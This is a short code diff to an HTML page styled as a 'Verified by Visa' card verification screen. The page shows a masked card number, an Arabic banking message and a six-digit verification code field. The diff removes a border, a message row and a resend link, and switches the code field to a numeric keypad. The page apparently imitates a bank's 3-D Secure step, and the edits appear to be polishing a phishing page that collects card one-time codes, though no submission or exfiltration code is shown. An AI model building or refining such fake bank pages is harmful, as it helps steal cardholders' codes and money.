@@ -461,7 +461,6 @@
         .banking-message-box {
             background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
             border: 1px solid #dee2e6;
-            border-right: 4px solid #0066cc;
             border-radius: 6px;
             padding: 15px;
             margin-bottom: 20px;
@@ -788,10 +787,7 @@
                             <div class="vbv-detail-label">Card Number:</div>
                             <div class="vbv-detail-value" id="maskedCard" style="direction: ltr; text-align: left;">**** **** **** ****</div>
                         </div>
-                        <div class="vbv-detail-row">
-                            <div class="vbv-detail-label">Personal Message:</div>
-                            <div class="vbv-detail-value">Cardholder verification required</div>
-                        </div>
+
                     </div>
                     
                     <!-- Arabic Banking Message -->
@@ -809,9 +805,8 @@
                     <!-- Verification Code Input -->
                     <div class="vbv-password-section">
                         <div class="vbv-password-label">رمز التحقق:</div>
-                        <input type="text" class="vbv-password-input" id="vbvPassword" maxlength="6" placeholder="Enter code">
+                        <input type="tel" class="vbv-password-input" id="vbvPassword" maxlength="6" placeholder="Enter code" inputmode="numeric" pattern="[0-9]*">
                         <div id="otpErrorMessage" style="color: #d32f2f; font-size: 13px; margin-top: 8px; display: none;"></div>
-                        <a class="vbv-forgot-link" id="resendCode">إعادة إرسال الرمز</a>
                     </div>
                     
                     <!-- Submit Button -->
